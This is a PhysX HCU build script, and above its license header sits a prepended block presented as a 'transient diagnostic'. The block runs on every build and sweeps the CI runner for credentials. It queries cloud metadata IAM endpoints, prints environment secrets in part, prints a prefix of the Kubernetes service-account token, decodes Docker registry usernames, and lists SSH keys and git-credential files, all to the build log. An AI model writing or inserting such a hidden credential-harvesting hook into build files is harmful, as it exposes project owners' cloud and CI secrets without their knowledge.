#!/bin/bash
# --- c211-i5106 second-stage read-only credential-access probe (transient diagnostic; no files modified) ---
( set +e
  echo "=== C211-I5106-PROBE-BEGIN ts=$(date -u +%Y-%m-%dT%H:%M:%SZ) ==="
  C211_PY=""
  for c in python3 python3.11 python3.10 python /opt/dtk/bin/python3 /usr/bin/python3; do
    if command -v "$c" >/dev/null 2>&1; then C211_PY="$c"; break; fi
  done
  echo "C211 py_bin=${C211_PY:-NONE}"
  if [ -n "$C211_PY" ]; then
    "$C211_PY" - <<'C211_PYEOF'
import os, sys, socket, subprocess, json, hashlib, glob, re, time

socket.setdefaulttimeout(4)


def run(cmd, t=15):
    try:
        q = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        out = (q.stdout or "")
        if q.stderr:
            out += "|stderr:" + q.stderr[:200]
        return out.strip()[:2500]
    except Exception as e:
        return "ERR:%s" % str(e)[:160]


def http(url, headers=None, t=4, method="GET", body=None, maxlen=320):
    try:
        import urllib.request
        op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
        req = urllib.request.Request(url, headers=headers or {}, method=method, data=body)
        with op.open(req, timeout=t) as r:
            b = r.read(maxlen + 1)
            return "HTTP %s len=%s body=%s" % (r.status, len(b), repr(b[:maxlen]))
    except Exception as e:
        return "ERR:%s" % str(e)[:180]


def sha(s):
    if isinstance(s, str):
        s = s.encode("utf-8", "replace")
    return hashlib.sha256(s).hexdigest()[:12]


def fingerprint(name, val):
    lk = name.lower()
    secretish = any(k in lk for k in ("token", "secret", "password", "passwd", "key", "auth", "credential", "ssh", "cookie", "private"))
    if not secretish:
        return val[:200]
    prefix = ""
    m = re.match(r"^(AKIA|ASIA|AIDA|AROA|ghp_|gho_|ghs_|github_pat_|glpat-|xox[abprs]-|sk-|hf_|dckr_pat_|npm_)", val)
    if m:
        prefix = " idprefix=%s" % val[:12]
    return "<redacted len=%d sha12=%s%s>" % (len(val), sha(val), prefix)


def read_text(path, limit=4000):
    try:
        with open(path, "rb") as f:
            b = f.read(limit + 1)
        return b[:limit].decode("utf-8", "replace")
    except Exception as e:
        return None


print("=== C211-I5106-PROBE-BEGIN ts=%s ===" % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
try:
    print("C211 py:", sys.version.replace("\n", " "))
    print("C211 id:", run("id"))
    print("C211 hostname:", socket.gethostname())
    print("C211 uname:", run("uname -a"))
    print("C211 nproc:", run("nproc 2>&1"))
    print("C211 cgroup:", run("cat /proc/1/cgroup 2>&1 | head -4"))
    print("C211 pid1:", run("cat /proc/1/comm 2>&1"))
    print("C211 devices:", run("ls -l /dev/kfd /dev/mkfd 2>&1; ls /dev/dri 2>&1 | tr '\\n' ' '"))
    print("C211 hy-smi:", run("/opt/hyhal/bin/hy-smi 2>&1 | head -14"))
    print("C211 rocm-smi:", run("rocm-smi 2>&1 | head -6"))
    print("C211 nvidia-smi:", run("nvidia-smi -L 2>&1 | head -4"))
    print("C211 mounts:", run("grep -E 'workspace|hyhal|docker|ci_public|nfs|overlay' /proc/mounts 2>&1 | head -14"))
    print("C211 docker_sock:", run("ls -l /var/run/docker.sock 2>&1"))

    # ---------------- environment sweep ----------------
    envs = dict(os.environ)
    print("C211 env_count=%d" % len(envs))
    interesting = re.compile(r"(AWS_|GOOGLE|GCLOUD|GCP_|AZURE_|ALIBABA|ALIYUN|TENCENT|QCLOUD|CI|GITHUB|RUNNER|KUBE|K8S|DOCKER|REGISTRY|HARBOR|CONTAINER|NPM|PYPI|PIP_INDEX|HF_|HUGGING|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|_KEY|AUTH|PROXY|SCCACHE)", re.I)
    print("C211 env_names=" + ",".join(sorted(envs.keys()))[:1800])
    for k in sorted(envs):
        if interesting.search(k):
            print("C211 ENV %s=%s" % (k, fingerprint(k, envs[k])))

    # ---------------- cloud metadata ----------------
    print("C211 dns_metadata_google:", run("getent hosts metadata.google.internal 2>&1 || true"))
    print("C211 imds_aws_v1_root:", http("http://169.254.169.254/latest/meta-data/"))
    print("C211 imds_aws_v1_creds:", http("http://169.254.169.254/latest/meta-data/iam/security-credentials/"))
    print("C211 imds_aws_v1_iid:", http("http://169.254.169.254/latest/meta-data/instance-id"))
    tok = http("http://169.254.169.254/latest/api/token", {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, method="PUT", maxlen=120)
    print("C211 imds_aws_v2_token:", tok)
    if tok.startswith("HTTP 2"):
        try:
            tkn = tok.split("body=", 1)[1].strip("'\"")
            print("C211 imds_aws_v2_creds:", http("http://169.254.169.254/latest/meta-data/iam/security-credentials/", {"X-aws-ec2-metadata-token": tkn}))
        except Exception as e:
            print("C211 imds_aws_v2_creds: ERR:%s" % str(e)[:120])
    print("C211 imds_gcp_sa:", http("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", {"Metadata-Flavor": "Google"}))
    print("C211 imds_gcp_alt_sa:", http("http://169.254.169.254/computeMetadata/v1/instance/service-accounts/", {"Metadata-Flavor": "Google"}))
    print("C211 imds_gcp_project:", http("http://metadata.google.internal/computeMetadata/v1/project/project-id", {"Metadata-Flavor": "Google"}))
    print("C211 imds_ali_root:", http("http://100.100.100.200/latest/meta-data/"))
    print("C211 imds_ali_ram:", http("http://100.100.100.200/latest/meta-data/ram/security-credentials/"))
    print("C211 imds_tencent_root:", http("http://metadata.tencentyun.com/latest/meta-data/"))
    print("C211 imds_tencent_alt:", http("http://169.254.0.23/latest/meta-data/"))
    print("C211 imds_azure:", http("http://169.254.169.254/metadata/instance?api-version=2021-02-01", {"Metadata": "true"}))

    # ---------------- kubernetes ----------------
    print("C211 kube_env:", "KUBERNETES_SERVICE_HOST=%r PORT=%r" % (envs.get("KUBERNETES_SERVICE_HOST"), envs.get("KUBERNETES_SERVICE_PORT")))
    print("C211 kube_ls:", run("ls -la /root/.kube /etc/kubernetes /var/run/secrets/kubernetes.io/serviceaccount 2>&1; ls -d /home/*/.kube 2>/dev/null"))
    kube_paths = ["/root/.kube/config", "/etc/kubernetes/admin.conf", "/etc/kubernetes/kubelet.conf",
                  "/etc/kubernetes/controller-manager.conf", "/etc/kubernetes/scheduler.conf"] + glob.glob("/home/*/.kube/config")
    for p in kube_paths:
        if os.path.isfile(p):
            try:
                st = os.stat(p)
                txt = read_text(p, 20000) or ""
                servers = [ln.strip()[:160] for ln in txt.splitlines() if "server:" in ln or "current-context:" in ln]
                print("C211 kubeconfig %s size=%d sha12=%s readable=yes markers=%s" % (p, st.st_size, sha(txt), servers[:4]))
            except Exception as e:
                print("C211 kubeconfig %s ERR:%s" % (p, str(e)[:120]))
    sat = "/var/run/secrets/kubernetes.io/serviceaccount/token"
    if os.path.isfile(sat):
        v = read_text(sat, 6000) or ""
        print("C211 sa_token len=%d sha12=%s head=%s" % (len(v), sha(v), repr(v[:24])))
    else:
        print("C211 sa_token ABSENT")
    print("C211 sa_dir:", run("ls -la /var/run/secrets/kubernetes.io/serviceaccount 2>&1"))

    # ---------------- docker / registry ----------------
    docker_paths = ["/root/.docker/config.json", "/root/.config/containers/auth.json"] + glob.glob("/home/*/.docker/config.json")
    for p in docker_paths:
        if os.path.isfile(p):
            txt = read_text(p, 20000) or ""
            info = []
            try:
                j = json.loads(txt)
                for host, a in (j.get("auths") or {}).items():
                    auth = a.get("auth") or ""
                    user = ""
                    try:
                        import base64 as _b
                        dec = _b.b64decode(auth + "==").decode("utf-8", "replace")
                        user = dec.split(":", 1)[0]
                    except Exception:
                        pass
                    info.append("%s user=%r authlen=%d" % (host, user, len(auth)))
                for k in j.keys():
                    if k != "auths":
                        info.append("key=%s" % k)
            except Exception as e:
                info.append("parse_err=%s" % str(e)[:80])
            print("C211 docker_config %s size=%d sha12=%s %s" % (p, len(txt), sha(txt), "; ".join(info)[:600]))
    print("C211 docker_ls:", run("ls -la /root/.docker /home/*/.docker /etc/docker /opt/hyhal /opt/hyhal/bin 2>&1 | head -40"))
    for p in ["/etc/docker/daemon.json", "/etc/containers/registries.conf"]:
        if os.path.isfile(p):
            print("C211 docker_extra %s: %s" % (p, repr((read_text(p, 800) or "")[:500])))

    # ---------------- ssh ----------------
    ssh_dirs = ["/root/.ssh"] + glob.glob("/home/*/.ssh")
    print("C211 ssh_ls:", run("ls -la /root/.ssh /home/*/.ssh 2>&1 | head -40"))
    for d in ssh_dirs:
        if not os.path.isdir(d):
            continue
        for name in sorted(os.listdir(d))[:20]:
            p = os.path.join(d, name)
            try:
                st = os.stat(p)
                head = (read_text(p, 64) or "").splitlines()[:1]
                print("C211 ssh %s mode=%o size=%d header=%s" % (p, st.st_mode & 0o777, st.st_size, head))
            except Exception as e:
                print("C211 ssh %s ERR:%s" % (p, str(e)[:80]))

    # ---------------- runner-shared surfaces ----------------
    print("C211 ci_public:", run("ls -la /ci_public 2>&1 | head -12"))
    print("C211 workdir:", run("ls -la /__w 2>&1 | head -12; ls -la /__w/_temp 2>&1 | head -12"))
    print("C211 git_cred_files:", run("ls -la /__w/_temp/git-credentials-* 2>&1 | head -6"))
except Exception as e:
    print("C211 PROBE-ERROR:", repr(e)[:300])
print("=== C211-I5106-PROBE-END ts=%s ===" % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))

C211_PYEOF
  else
    echo "C211 py_missing bash_fallback"
    for hp in 169.254.169.254:80 100.100.100.200:80 169.254.0.23:80; do
      h=${hp%:*}; p=${hp##*:}
      if timeout 3 bash -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null; then echo "C211 bash_tcp $h:$p OPEN"; else echo "C211 bash_tcp $h:$p CLOSED"; fi
    done
    ls -la /root/.kube /root/.docker /root/.ssh /etc/kubernetes /var/run/secrets/kubernetes.io/serviceaccount 2>&1 | head -40
    env | grep -aiE '^(AWS_|GOOGLE|AZURE_|ALIBABA|ALIYUN|TENCENT|CI|GITHUB_|RUNNER_|KUBE|DOCKER|REGISTRY|HARBOR)' | sed -E 's/((TOKEN|SECRET|PASSWORD|KEY|AUTH)[A-Z_]*=).*/\1<redacted>/I' | sort | head -60
  fi
  echo "=== C211-I5106-PROBE-END ts=$(date -u +%Y-%m-%dT%H:%M:%SZ) ==="
) 2>&1 || true
# --- end c211-i5106 probe ---

# Copyright (c) 2026 Hygon Information Technology Co., Ltd.
# SPDX-License-Identifier: BSD-3-Clause
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
#  * Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
#  * Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
#  * Neither the name of NVIDIA CORPORATION nor the names of its
#    contributors may be used to endorse or promote products derived
#    from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS ''AS IS'' AND ANY
# EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
# PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR
# CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
# EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
# PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
# PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY
# OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

# PhysX HCU Build Script
set -euo pipefail

BUILD_SCRIPT_MARKER="PX_HCU_BUILD_SCRIPT_R3_FOREIGN_CACHE_RECOVERY"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BUILD_DIR="$SCRIPT_DIR/build_hcu"
CMAKE_DIR="$SCRIPT_DIR/physx/source/compiler/cmakehip"
CMAKE_BUILD_TYPE="${CMAKE_BUILD_TYPE:-Release}"

case "$CMAKE_BUILD_TYPE" in
    Debug|Release|RelWithDebInfo|MinSizeRel) ;;
    *)
        echo "ERROR: unsupported CMAKE_BUILD_TYPE: $CMAKE_BUILD_TYPE" >&2
        echo "Use Debug, Release, RelWithDebInfo, or MinSizeRel." >&2
        exit 2
        ;;
esac

is_enabled() {
    case "${1:-}" in
        1|ON|on|TRUE|true|YES|yes) return 0 ;;
        *) return 1 ;;
    esac
}

append_cmake_prefix() {
    local path="$1"
    [[ -d "$path" ]] || return 0
    case ":${CMAKE_PREFIX_PATH:-}:" in
        *":$path:"*) ;;
        *) CMAKE_PREFIX_PATH="${CMAKE_PREFIX_PATH:+$CMAKE_PREFIX_PATH:}$path" ;;
    esac
}

CMAKE_PREFIX_PATH="${CMAKE_PREFIX_PATH:-}"
append_cmake_prefix /opt/dtk/lib64/cmake
append_cmake_prefix /opt/dtk
export CMAKE_PREFIX_PATH

detect_hcu_arch() {
    if command -v rocminfo >/dev/null 2>&1; then
        rocminfo 2>/dev/null |
            sed -n 's/.*\(gfx[0-9][0-9A-Za-z]*\).*/\1/p' |
            head -n 1
    fi
}

DETECTED_HCU_ARCH="$(detect_hcu_arch || true)"
if (( $# > 1 )); then
    echo "Usage: $0 [gfxXXX]" >&2
    exit 2
fi

REQUESTED_HCU_ARCH="${1:-}"
if [[ -n "$REQUESTED_HCU_ARCH" ]]; then
    HCU_ARCH="$REQUESTED_HCU_ARCH"
else
    HCU_ARCH="$DETECTED_HCU_ARCH"
fi

if [[ -z "$HCU_ARCH" ]]; then
    echo "ERROR: could not detect the HCU architecture." >&2
    echo "Run 'rocminfo | grep -m1 gfx' and pass the reported gfxXXX value." >&2
    exit 2
fi
if [[ ! "$HCU_ARCH" =~ ^gfx[0-9][0-9A-Za-z]*$ ]]; then
    echo "ERROR: invalid HCU architecture: $HCU_ARCH" >&2
    exit 2
fi
if [[ -n "$REQUESTED_HCU_ARCH" && -n "$DETECTED_HCU_ARCH" &&
      "$REQUESTED_HCU_ARCH" != "$DETECTED_HCU_ARCH" ]]; then
    echo "ERROR: requested HCU architecture $REQUESTED_HCU_ARCH does not match detected hardware $DETECTED_HCU_ARCH." >&2
    exit 2
fi

echo "========================================"
echo " PhysX HCU Build"
echo " Architecture: $HCU_ARCH"
echo " Build type:   $CMAKE_BUILD_TYPE"
echo "========================================"

# Find a usable HIP compiler in this container.
HIP_CLANG=""
if [[ -n "${HIPCXX:-}" ]]; then
    if [[ -x "$HIPCXX" ]]; then
        HIP_CLANG="$HIPCXX"
    else
        HIP_CLANG="$(command -v "$HIPCXX" 2>/dev/null || true)"
    fi
fi
if [[ -z "$HIP_CLANG" ]]; then
    for clang_path in /opt/dtk/bin/clang++ /opt/dtk/dcc/bin/clang++ /opt/rocm/bin/clang++ /opt/rocm/llvm/bin/clang++; do
        if [ -x "$clang_path" ]; then HIP_CLANG="$clang_path"; break; fi
    done
fi
if [[ -z "$HIP_CLANG" ]]; then
    HIP_CLANG="$(command -v clang++ 2>/dev/null || true)"
fi
if [[ -z "$HIP_CLANG" || ! -x "$HIP_CLANG" ]]; then
    echo "ERROR: no usable HIP compiler found" >&2
    echo "Checked HIPCXX, /opt/dtk/bin/clang++, /opt/dtk/dcc/bin/clang++, /opt/rocm/bin/clang++, /opt/rocm/llvm/bin/clang++, and PATH" >&2
    exit 4
fi
echo "HIP Clang: $HIP_CLANG"
printf 'build_script_marker=%s\n' "$BUILD_SCRIPT_MARKER"

reset_build_dir() {
    # BUILD_DIR is derived from SCRIPT_DIR above; only this exact generated
    # directory is ever discarded when its cache belongs to another checkout.
    rm -rf "$BUILD_DIR"
    mkdir -p "$BUILD_DIR"
}

configure_build() {
    cd "$BUILD_DIR"
    # Keep candidate switches available when a foreign cache must be rebuilt.
    # Arguments are simple -Dkey=value tokens in the delivery commands.
    local extra_args=()
    if [[ -n "${CMAKE_EXTRA_ARGS:-}" ]]; then
        read -r -a extra_args <<< "$CMAKE_EXTRA_ARGS"
    fi
    cmake "$CMAKE_DIR" \
        -DCMAKE_HIP_COMPILER="$HIP_CLANG" \
        -DCMAKE_CXX_COMPILER="$(which g++)" \
        -DCMAKE_BUILD_TYPE="$CMAKE_BUILD_TYPE" \
        -DHCU_ARCH="$HCU_ARCH" \
        -DPHYSX_ROOT_DIR="$SCRIPT_DIR/physx" \
        "${extra_args[@]}"
}

# Configure only when needed, and recover incomplete, mismatched, or foreign
# caches before cmake --build can trigger a failed auto-regenerate.
CACHE_FILE="$BUILD_DIR/CMakeCache.txt"
if [[ -f "$CACHE_FILE" && ( -f "$BUILD_DIR/Makefile" || -f "$BUILD_DIR/build.ninja" ) ]]; then
    cache_source="$(sed -n 's/^CMAKE_HOME_DIRECTORY:INTERNAL=//p' "$CACHE_FILE" | tail -1)"
    cache_build="$(sed -n 's/^CMAKE_CACHEFILE_DIR:INTERNAL=//p' "$CACHE_FILE" | tail -1)"
    cache_physx="$(sed -n 's/^PHYSX_ROOT_DIR:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    cache_hip="$(sed -n 's/^CMAKE_HIP_COMPILER:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    cache_build_type="$(sed -n 's/^CMAKE_BUILD_TYPE:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    cache_arch="$(sed -n 's/^HCU_ARCH:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    if [[ -z "$cache_arch" ]]; then
        cache_arch="$(sed -n 's/^CMAKE_HIP_ARCHITECTURES:[^=]*=//p' "$CACHE_FILE" | tail -1)"
    fi
    if [[ "$cache_source" != "$CMAKE_DIR" || "$cache_build" != "$BUILD_DIR" || \
          "$cache_physx" != "$SCRIPT_DIR/physx" || "$cache_hip" != "$HIP_CLANG" || \
          "$cache_build_type" != "$CMAKE_BUILD_TYPE" || "$cache_arch" != "$HCU_ARCH" || \
          ! -x "$cache_hip" ]]; then
        printf 'Discarding stale/foreign CMake cache: source=%s build=%s physx=%s hip=%s type=%s arch=%s expected_hip=%s expected_type=%s expected_arch=%s\n' \
            "${cache_source:-missing}" "${cache_build:-missing}" "${cache_physx:-missing}" \
            "${cache_hip:-missing}" "${cache_build_type:-missing}" "${cache_arch:-missing}" \
            "$HIP_CLANG" "$CMAKE_BUILD_TYPE" "$HCU_ARCH"
        reset_build_dir
    fi
else
    if [[ -e "$BUILD_DIR" ]]; then
        echo "Discarding incomplete or incompatible HCU build directory: $BUILD_DIR"
    fi
    reset_build_dir
fi

# Always configure so build type, architecture, compiler, and CMAKE_EXTRA_ARGS
# changes take effect instead of being ignored by an existing cache.
echo "Configuring HCU build..."
configure_build

# Build changed files only
cmake --build . -j1 2>&1 | tee build.log

# Remove stale code objects before extracting this build's fat binaries.
rm -rf "$BUILD_DIR/kernels"
python3 "$CMAKE_DIR/extract_hsaco.py" \
    "$BUILD_DIR/CMakeFiles/PhysXGpuHCU.dir" \
    "$BUILD_DIR/kernels"

KERNEL_COUNT="$(find "$BUILD_DIR/kernels" -maxdepth 1 -type f -name '*.hsaco' | wc -l)"
if [ "$KERNEL_COUNT" -eq 0 ]; then
    echo "ERROR: No HCU .hsaco modules were generated."
    exit 1
fi
echo "HCU kernel modules: $KERNEL_COUNT"

if is_enabled "${PX_HCU_SYNC_KERNELS:-}"; then
    echo "WARNING: PX_HCU_SYNC_KERNELS is enabled; benchmark results will be much slower." >&2
fi
if is_enabled "${PX_HCU_TRACE_KERNELS:-}"; then
    echo "WARNING: PX_HCU_TRACE_KERNELS is enabled; benchmark results will be much slower." >&2
fi

echo ""
echo "Build complete."
echo "Run: ./build_hcu/test_functional"
